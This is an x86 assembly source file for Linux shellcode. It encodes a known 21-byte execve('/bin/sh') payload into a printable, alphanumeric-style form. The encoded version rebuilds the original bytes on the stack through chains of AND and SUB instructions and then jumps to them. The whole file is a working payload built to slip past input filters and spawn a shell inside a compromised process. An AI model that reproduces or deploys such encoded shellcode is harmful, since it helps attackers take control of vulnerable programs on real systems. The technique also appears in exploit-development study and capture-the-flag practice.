; Original shellcode (Linux/x86 - Tiny Execve sh Shellcode - 21 bytes by Geyslan G. Bem): http://shell-storm.org/shellcode/files/shellcode-841.php
;  0:    31 c9                    xor    ecx, ecx
;  2:    f7 e1                    mul    ecx
;  4:    b0 0b                    mov    al, 0xb
;  6:    51                       push   ecx
;  7:    68 2f 2f 73 68           push   0x68732f2f
;  c:    68 2f 62 69 6e           push   0x6e69622f
; 11:    89 e3                    mov    ebx, esp
; 13:    cd 80                    int    0x80

; Modified shellcode (96 bytes)
; "%JMNU%521*-$/=+-0ov'-#~~,Ph/binh/shh%JMNU%521*-_$@>-`*%"-6`2pP%JMNU%521*-AG~a-xG$o-~y{~PhAIA1T" + "\xc3"(ret non-printable)
; We generate the shellcode in the stack and then jump to it.

bits 32

; Set eax to zero
and eax, 0x554e4d4a
and eax, 0x2a313235

; Creates 0x80cde389 in eax
sub eax, 0x2b3d2f24
sub eax, 0x27766f30
sub eax, 0x2c7e7e23

push eax

; 0x6e69622f
push 0x6e69622f

; 0x6868732f
push 0x6868732f

; Set eax to zero
and eax, 0x554e4d4a
and eax, 0x2a313235

; Creates 0x2f68510b in eax
sub eax, 0x3e40245f
sub eax, 0x22252a60
sub eax, 0x70326036

push eax

; Set eax to zero
and eax, 0x554e4d4a
and eax, 0x2a313235

; Creates 0xb0e1f7c9 in eax
sub eax, 0x617e4741
sub eax, 0x6f244778
sub eax, 0x7e7b797e

push eax

; 0x31414941
push 0x31414941

; Jump to shellcode
push esp
ret ; \xc3 [!]